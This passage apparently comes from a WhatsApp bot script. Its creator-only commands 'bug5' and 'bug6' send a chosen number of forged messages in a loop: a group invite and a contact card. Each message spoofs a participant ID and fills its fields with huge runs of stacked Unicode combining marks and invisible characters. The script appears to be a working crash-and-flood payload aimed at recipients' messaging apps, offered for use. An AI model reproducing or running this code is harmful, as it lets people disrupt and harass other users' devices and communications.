"mediaKeyTimestamp": "1632753911"
  }
   }
}
hwbro(m.chat, `© 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ VN`, main)
}
}
break
//=================================================//
case 'bug5': {
if(!m.key.fromMe) return
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
},
  "message": {
  "groupInviteMessage": {
"groupJid": "120363025461390219@g.us",
"inviteCode": "z0JcSBd3mAhIfSSY",
"inviteExpiration": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ ${ngazap(prefix)}`,
"groupName": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ ${ngazap(prefix)}`,
"caption": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ ${ngazap(prefix)}`
 }
   }
}
bacit(m.chat, `© 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INVITE`, main)
}
}
break
//=================================================//
case 'bug6': {
if(!m.key.fromMe) return
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
},
  "message": {
  "contactMessage": {
"displayName": "🔥 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ 🔥‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎